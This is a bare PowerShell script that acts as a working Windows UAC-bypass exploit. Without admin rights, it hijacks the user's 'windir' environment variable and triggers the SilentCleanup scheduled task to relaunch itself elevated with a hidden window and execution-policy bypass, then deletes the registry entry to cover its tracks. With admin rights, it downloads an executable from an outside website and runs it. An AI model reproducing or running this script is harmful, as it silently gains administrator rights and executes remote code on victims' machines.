if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    # Download and execute the executable file
    Invoke-WebRequest -Uri "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe" -OutFile "$env:TEMP\advbattoexeconverter.exe"
    Start-Process "$env:TEMP\advbattoexeconverter.exe"
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
